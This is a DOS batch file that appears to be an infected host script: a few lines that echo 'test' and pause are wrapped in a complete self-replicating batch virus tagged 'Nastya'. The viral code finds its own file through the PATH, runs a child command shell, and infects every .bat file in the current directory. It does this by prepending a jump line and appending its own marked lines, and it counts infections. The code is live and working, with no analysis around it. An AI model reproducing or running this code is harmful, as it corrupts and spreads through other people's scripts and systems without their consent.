@if '%_Nastya%==' goto _Nastya
@echo off
cls
echo test
pause
@if '%_Nastya%==' goto _Nastya
@if not '%_Nastya%==' goto Nastyaend
:_Nastya Nastya
@echo off%_Nastya%
if '%1=='Nastya goto Nastya%2
set Nastya=%0.bat
if not exist %Nastya% set Nastya=%0
call %Nastya% Nastya h %path%
if exist %Nastya% goto Nastyafe
goto eNastya
:Nastyah
shift%_Nastya%
if '%2==' goto Nastyaend
if exist %2\%Nastya% set Nastya=%2\%Nastya%
if exist %2%Nastya% set Nastya=%2%Nastya%
if exist %2\%Nastya%.bat set Nastya=%2\%Nastya%.bat
if exist %2%Nastya%.bat set Nastya=%2%Nastya%.bat
if not exist %Nastya% goto Nastyah
goto Nastyaend
:Nastyafe
command /e:5000 /c %Nastya% Nastya vir
:eNastya
call %Nastya% Nastya rh
set _Nastya=>nul.Nastya
del nul.Nastya>nul
set !Nastya=
set Nastya=
goto Nastyaend
:Nastyarh
set _Nastya=x%_Nastya%
%Nastya% %!Nastya%
:Nastyavir
for %%a in (*.bat) do call %Nastya% Nastya i %%a
exit Nastya
:Nastyai
find "Nastya"<%3>nul
if not errorlevel 1 goto Nastyaj
echo @if '%%_Nastya%%==' goto _Nastya>Nastya$
type %3>>Nastya$
echo.>>Nastya$
find "Nastya"<%Nastya%>>Nastya$
move Nastya$ %3>nul
exit Nastya
:Nastyaj
set Nastya!=%Nastya!%1
if %Nastya!%==11111111 exit
:Nastyaend
